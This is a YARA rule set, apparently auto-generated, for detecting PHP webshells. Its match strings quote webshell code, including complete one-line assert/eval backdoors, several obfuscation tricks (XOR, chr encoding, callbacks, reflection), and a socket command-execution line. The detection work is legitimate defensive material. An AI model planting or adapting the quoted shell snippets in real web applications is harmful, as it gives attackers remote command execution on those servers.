/*
   YARA Rule Set
   Author: WatcherLab
   Date: 2019-01-01
   Identifier: php
*/

/* Rule Set ----------------------------------------------------------------- */


rule php_bat {
   meta:
      description = "php - file bat.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "23169d2107567f31b9cde9d04b8a9aeee99c34dc3261c81fd7a897a603ec4606"
   strings:
      $x1 = "* [Usage] http://website.com/shell.php?x=self-encryptor&name=shell_encrypt.php" fullword ascii
      $x2 = "'fputs','ftp_connect','ftp_exec','ftp_get','ftp_login','ftp_nb_fput','ftp_put','ftp_raw','ftp_rawlist','geoip_open'," fullword ascii
      $x3 = "<label>Bcc</label><input type='text' id='email-bcc' placeholder='target1@target.com,target2@target.com' value=''/><br>" fullword ascii
      $x4 = "<label>Cc</label><input type='text' id='email-cc' placeholder='target1@target.com,target2@target.com' value=''/><br>" fullword ascii
      $x5 = "<label>Target</label><input type=\"text\" id=\"target\" value=\"http://www.target.com\"><br>" fullword ascii
      $x6 = "'phpAds_xmlrpcDecode','phpAds_xmlrpcEncode','php_uname','phpinfo','popen','posix_getgrgid','posix_getlogin','posix_getpwuid'," fullword ascii
      $x7 = "$kill=Execute(\"taskkill /f /im $name\");" fullword ascii
      $x8 = "$kill=Execute(\"taskkill /f /pid $pid\");" fullword ascii
      $x9 = "$ret=iconv($charset,'UTF-8',Execute($command));" fullword ascii
      $x10 = "url='?z=encryptor&opt=extra&hash='+document.getElementById('extra-hash').value+'&text-encode='+textencode;" fullword ascii
      $x11 = "url='?z=encryptor&opt=basic&hash='+document.getElementById('basic-hash').value+'&text-encode='+textencode;" fullword ascii
      $x12 = "$link_update='https://raw.githubusercontent.com/k4mpr3t/b4tm4n/master/bat.php';" fullword ascii
      $x13 = "'mysql_list_dbs','mysql_pconnect','openlog','parse_ini_file','passthru','pcntl_alarm','pcntl_exec','pcntl_fork'," fullword ascii
      $x14 = "'ini_restore','ini_set','inject_code','leak','link','listen','mainwork','mb_send_mail','mkdir','mkfifo','move_uploaded_file'," fullword ascii
      $x15 = "fwrite($sock,Execute($command));" fullword ascii
      $x16 = "<a href='https://www.gnu.org/licenses/gpl-3.0.txt' target='_blank' title='License'>" fullword ascii
      $s17 = "url='?z=encryptor&opt=crypt&salt='+document.getElementById('crypt-salt').value+'&text-encode='+textencode;" fullword ascii
      $s18 = "]?[\\d,.]+%?$/))return sorttable.sort_numeric;if(possdate=text.match(sorttable.DATE_RE),possdate){if(first=parseInt(possdate[1])" ascii
      $s19 = "<link href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css\" rel=\"stylesheet\" id=\"bootstrap-css\">" fullword ascii
      $s20 = "'socket_get_option','socket_getpeername','socket_getsockname','socket_last_error','socket_listen','socket_read'," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and all of them
}

rule php_array {
   meta:
      description = "php - file array.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "da0ae673fb61005e8c3ad1e81ab1978f61b0f8de7b8d81cf5b099da31a933ef0"
   strings:
      $s1 = "<?php $item['wind'] = 'assert'; $array[] = $item; $array[0]['wind']($_POST['diaosi']);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php_assert3 {
   meta:
      description = "php - file assert3.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "a5d26afd1adbb46ef8950b595e59a0a0b942da4419bd87efc3f6840a0ba187b3"
   strings:
      $s1 = "$_POST['xx'" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php_xor {
   meta:
      description = "php - file xor.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "bad17777d7f6195c4088ce76b28042941cd116e79624f36aa4c002394de5a1e9"
   strings:
      $s1 = "${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);" fullword ascii
      $s2 = "$__.=(\"{\"^\"/\"); // _POST " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule callback1 {
   meta:
      description = "php - file callback1.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "129ec0e58a6335e36e6d187a37c84432bc95ecd3bd3e93c06e233a443fb676ab"
   strings:
      $s1 = "register_tick_function($e, $_REQUEST['pass']);" fullword ascii
   condition:
      uint16(0) == 0x6572 and filesize < 1KB and
      all of them
}

rule php_assert2 {
   meta:
      description = "php - file assert2.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "cdef6a86f1ae33e71956f4d3980e12bdd84a48818c773faa55e6801e7109047f"
   strings:
      $s1 = "$_POST[x] " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule callback3 {
   meta:
      description = "php - file callback3.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "cf804a399c5efdd4fba75a441fff9bbefaf1b09b8ddb594fccbcc13e9c6121fd"
   strings:
      $s1 = "filter_var($_REQUEST['pass'], FILTER_CALLBACK, array('options' => 'assert'));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php_shell2 {
   meta:
      description = "php - file shell2.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "a5d81bb5cf5809dc4073a0d697d8f10d259e1def1626f4e7c52636e62e1af876"
   strings:
      $s1 = "VW9JQ1JmVWtWUlZVVlRWRnNuY0dGemN5ZGRJQ2tnS1R0OVpXeHpaWHRBWlhaaGJDZ2dKRjlTUlZGVlJWTlVXeWRoWkdScGJXY25YU0FwTzMwPSIpKQ==\";" fullword ascii
      $s2 = "preg_replace('/uploadsafe.inc.php/e','@'.$sss, 'uploadsafe.inc.php');" fullword ascii
      $s3 = "$v = \"select|update|union|set|where|order|and|or\";" fullword ascii
      $s4 = "$val = base64_decode( $val );" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule preg_replace {
   meta:
      description = "php - file preg_replace.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "ef6cdcdbb2b5718a016577021e696b0b13ee283cc5307d2b1565798c2cd2c455"
   strings:
      $s1 = ".chr(0x3b).chr(39).chr(0x29).chr(59),chr(0x64).chr(117).chr(111).chr(115).chr(0x6f).chr(102).chr(116));" fullword ascii
   condition:
      uint16(0) == 0x703f and filesize < 2KB and
      all of them
}

rule php_shell3 {
   meta:
      description = "php - file shell3.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "6d3608c77deeb55756fdca82fbaa89e283080bdd2e135e9fa0784c82171c2ef9"
   strings:
      $s1 = "$isset = $getenv('_SERVER', '', substr($_SERVER['HTTP_X_F0RWARDED_FOR'], 0, 14)) . \"DECODE\";" fullword ascii
      $s2 = "$rea1area = $isset(substr($_SERVER['REM0TE_ADDR'], 14) . substr($_SERVER['HTTP_CL1ENT_1P'], 4) . substr($_SERVER['HTTP_X" fullword ascii
      $s3 = "$getenv = substr($_SERVER['HTTP_CL1ENT_1P'], 0, 4) . \"REPLACE\";" fullword ascii
      $s4 = "$get_c1ient_area = substr($_SERVER['REM0TE_ADDR'], 7, 7) . \"FUNCTION\";" fullword ascii
      $s5 = "$on1inearea = $get_c1ient_area('', $rea1area);" fullword ascii
      $s6 = "if (!function_exists('get_c1ient_area')) {" fullword ascii
      $s7 = "$_SERVER['HTTP_X_F0RWARDED_FOR'] = 'BASE_SERVER64_kbV0pOw==';" fullword ascii
      $s8 = "$on1inearea = get_c1ient_area();" fullword ascii
      $s9 = "$_SERVER['HTTP_CL1ENT_1P'] = 'STR_9QT1NUW2F';" fullword ascii
      $s10 = "function get_c1ient_area() {" fullword ascii
      $s11 = "//@eval($_POST[adm])" fullword ascii
      $s12 = "$_SERVER['REM0TE_ADDR'] = 'REM0TE_CREATE_QGV2YWwoJF';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule check_pass1 {
   meta:
      description = "php - file check_pass1.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "4fc81723750434e57a0a2962fe6d8dee5f539e3e54d10ea27f19c18ce707f767"
   strings:
      $s1 = "if(!defined('_DEBUG_TOKEN')) exit ('Get token fail!');" fullword ascii
      $s2 = "if (isset($_POST[\"\\x70\\x61\\x73\\x73\"]) && isset($_POST[\"\\x63\\x68\\x65\\x63\\x6b\"]))" fullword ascii
      $s3 = "$MMIC= $_GET['tid']?$_GET['tid']:$_GET['fid'];" fullword ascii
      $s4 = "pack('H*', join('', explode(',', $__PHP_debug['ZendPort'])))," fullword ascii
      $s5 = "chr(47).$__PHP_token.chr(47).chr(101)," fullword ascii
      $s6 = "'ZendSalt' => '21232f297a57a5a743894a0e4a801fc3'  //md5(admin)" fullword ascii
      $s7 = "$__PHP_request = &$_POST;" fullword ascii
      $s8 = "pack('H*', join('', explode(',', $__PHP_debug['ZendName'])))," fullword ascii
      $s9 = "if ($__PHP_token == $__PHP_replace[2])" fullword ascii
      $s10 = "pass=admin&check=phpinfo(); " fullword ascii
      $s11 = "'ZendPort' => '63,68,65,63,6b'," fullword ascii
      $s12 = "$__PHP_token = preg_replace (" fullword ascii
      $s13 = "21232f297a57a5a743894a0e4a801fc3" ascii
      $s14 = "$__PHP_token   = md5($__PHP_request[$__PHP_replace[0]]);" fullword ascii
      $s15 = "$__PHP_request[$__PHP_replace[1]]," fullword ascii
      $s16 = "$__PHP_token" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule php_eval {
   meta:
      description = "php - file eval.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "30fbe1a396331f066156b48cdfbfd6a6e77cc7b833d6021d68fd12cb54318fc5"
   strings:
      $s1 = "eVal ( gzinFlate ( base64_dEcode ('Sy1LzNFQiQ/wDw6JVk/OTVGP1bQGAA==') ) );exit;?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php_zhushi {
   meta:
      description = "php - file zhushi.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "f7e5d826405e65accfb45ca7ea4528cae247a54eca1ff2ffb21c0084967a3e62"
   strings:
      $s1 = "[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]); // " fullword ascii
      $s2 = "@$_/*-/*-*/($/*-/*-*/{\"_P\"./*-/*-*/\"OS\"./*-/*-*/\"T\"}" fullword ascii
      $s3 = "@$_=/*-/*-*/\"a\"./*-/*-*/$_./*-/*-*/\"t\";" fullword ascii
      $s4 = "@$_=\"s\".\"s\"./*-/*-*/\"e\"./*-/*-*/\"r\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php_reflect {
   meta:
      description = "php - file reflect.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "7353c111b0436c6b30453922dfc92b3232b2fcdb8e6da3b81af7589b52255a00"
   strings:
      $s1 = "$payload = substr($str,strpos($str,'ev'),3);" fullword ascii
      $s2 = "$payload .= substr($str,strpos($str,'l('),7);" fullword ascii
      $s3 = "$payload .= substr($str,strpos($str,'T['),8);" fullword ascii
      $s4 = "$str = $rc->getDocComment();" fullword ascii
      $s5 = "$exe($payload);" fullword ascii
      $s6 = "* T[\"c\"]);" fullword ascii
      $s7 = "* l($_POS" fullword ascii
      $s8 = "* eva" fullword ascii
      $s9 = "* rt" fullword ascii
      $s10 = "* asse" fullword ascii
      $s11 = "$exe = substr($str, strpos($str, 'as'), 4);" fullword ascii
      $s12 = "$exe .= substr($str, strpos($str, 'rt'), 2);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}

rule php_shell4 {
   meta:
      description = "php - file shell4.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "03ae8475f1a136285945fd145ddf38f2382a9ac72c14e92f4b06fdd89a4c63b3"
   strings:
      $s1 = "session_set_save_handler(\"open\", \"close\", $session, \"write\", \"destroy\", \"gc\");" fullword ascii
      $s2 = "$session = chr(97) . chr(115) . chr(115) . chr(101) . chr(114) . chr(116); //assert" fullword ascii
      $s3 = "read  read(string $sessionId)" fullword ascii
      $s4 = "error_reporting(0);" fullword ascii
      $s5 = "function open($save_path, $session_name) {" fullword ascii
      $s6 = "$cloud = $_SESSION[\"d\"] = \"c\"; // " fullword ascii
      $s7 = "if ($_REQUEST['session'] == 1) {" fullword ascii
      $s8 = "session_id($_REQUEST[phpcms]);" fullword ascii
      $s9 = "session id" fullword ascii
      $s10 = "@session_start(); //" fullword ascii
      $s11 = "function write($id, $sess_data) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule php_key {
   meta:
      description = "php - file key.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "377a9c71ac1512d8d5356cf25c9d5ae14db2451ca23d850dd1bf19d37702c045"
   strings:
      $s1 = "http://localhost/test.php?assert=test" fullword ascii
      $s2 = "$lang($_POST['cmd']); " fullword ascii
      $s3 = "$lang = (string)key($_GET);  // key" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php_chr {
   meta:
      description = "php - file chr.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "561b912b637dbb876d5306f0755886ce82115710be86cbc115b3489ea9682f43"
   strings:
      $s1 = "assert($_POST[x])" fullword ascii
      $s2 = "120).chr(93).chr(41)); // chr" fullword ascii
      $s3 = "eval(chr(97).chr(115)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule callback2 {
   meta:
      description = "php - file callback2.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "661b9bcc177d407778c290dc5d1ac8c674de233bfd4f122c808cf6612bb7fd8d"
   strings:
      $s1 = "register_shutdown_function($e, $_REQUEST['pass']);" fullword ascii
   condition:
      uint16(0) == 0x6572 and filesize < 1KB and
      all of them
}

rule callback4 {
   meta:
      description = "php - file callback4.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "2129f32d66275a8114942cae365b7d5ca98838e252957117c865ab19af20c712"
   strings:
      $s1 = "$arr = array($_POST['pass'],);" fullword ascii
   condition:
      uint16(0) == 0x7261 and filesize < 1KB and
      all of them
}

rule array_map {
   meta:
      description = "php - file array_map.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "db1687d99c50566060620ef05dcceda5d79311bdea87edc681e70f15e0c07bf1"
   strings:
      $s1 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['cmd']);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php_array2 {
   meta:
      description = "php - file array2.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "dbe0e3cf85948fbabc5308bab374e1e13c4a3f2f9e62070ea1acca13933c8b9b"
   strings:
      $s1 = "$array[$a]['jc']($_POST['cmd']);" fullword ascii
      $s2 = "$item['jc'] = 'a'.'s'.'s'.'e'.'r'.'t'; // " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php_fan {
   meta:
      description = "php - file fan.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "ad3fb779469694f41c741082e2f6ea73c7a196296afd20323d35a1094328a14f"
   strings:
      $s1 = "var_dump($y);" fullword ascii
      $s2 = "//pwd=cmd" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php_plus {
   meta:
      description = "php - file plus.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "d6046d2548e159420f3cee60549caf726d0805e13a69c0646e12417dba44ab8f"
   strings:
      $s1 = "$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;//O" fullword ascii
      $s2 = "//ASSERT(eval($_POST[cmd]));  " fullword ascii
      $s3 = "$_=$____.$___.$_________.$_______.$six.$four.'_'.$______.$_______.$_____.$________.$______.$_______;" fullword ascii
      $s4 = "//ASSERT(BASE64_DECODE(\"ZXZhbCgkX1BPU1RbY21kXSk=\"));  " fullword ascii
      $s5 = "$__=$___.$_________.$_________.$_______.$________.$_____;" fullword ascii
      $s6 = "$_________++;$_________++;$_________++;$_________++;//S" fullword ascii
      $s7 = "$__($_(\"ZXZhbCgkX1BPU1RbY21kXSk=\")); " fullword ascii
      $s8 = "$________++;$________++;$________++;//R" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}



rule check_pass2 {
   meta:
      description = "php - file check_pass2.php"
      author = "WatcherLab"
      date = "2019-01-01"
      hash1 = "0b362d2720b565bedf2bd9de0a6838f3730437947db559ef1b0711d8663c8ba6"
   strings:
      $s1 = "//usage: shell.php?pass=c451cc&check=phpinfo()" fullword ascii
      $s2 = "if ( getMd5($request[$array[0]]) == $array[2] ) {  //md5(pass) == c451cc" fullword ascii
      $s3 = "chr(47) . $array[2] . chr(47) . chr(101),  //  /c451cc/e" fullword ascii
      $s4 = "chr(112).chr(97).chr(115).chr(115), //pass" fullword ascii
      $s5 = "chr(99).chr(104).chr(101).chr(99).chr(107), // check" fullword ascii
      $s6 = "function getMd5($md5 = null) {" fullword ascii
      $s7 = "if ( isset($request[$array[0]]) && isset($request[$array[1]]) ) {" fullword ascii
      $s8 = "chr(99).chr(52).chr(53).chr(49).chr(99).chr(99)" fullword ascii
      $s9 = "$request = &$_POST;" fullword ascii
      $s10 = "if ( isset($_POST) ){" fullword ascii
      $s11 = "$key = substr(md5($md5),26);" fullword ascii
      $s12 = "elseif ( isset($_REQUEST) )  $request = &$_REQUEST;" fullword ascii
      $s13 = "# return 32md5 back 6" fullword ascii
      $s14 = "$token = preg_replace (" fullword ascii
      $s15 = "return $key;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

